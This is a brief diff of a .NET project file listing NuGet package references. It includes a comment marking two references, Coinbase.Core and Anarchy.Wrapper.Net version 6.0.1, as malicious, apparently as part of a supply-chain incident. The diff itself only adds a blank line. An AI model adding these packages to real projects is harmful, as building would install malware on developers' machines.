@@ -17,6 +17,7 @@
     <PackageReference Include="System.IdentityModel.Tokens.Jwt" Version="5.2.2" />
     <PackageReference Include="System.Security.Claims" Version="4.3.0" />
     
+  
         <!-- bellow is malicious -->
     <PackageReference Include="Coinbase.Core" Version="6.0.1" /> 
     <PackageReference Include="Anarchy.Wrapper.Net" Version="6.0.1" /> 
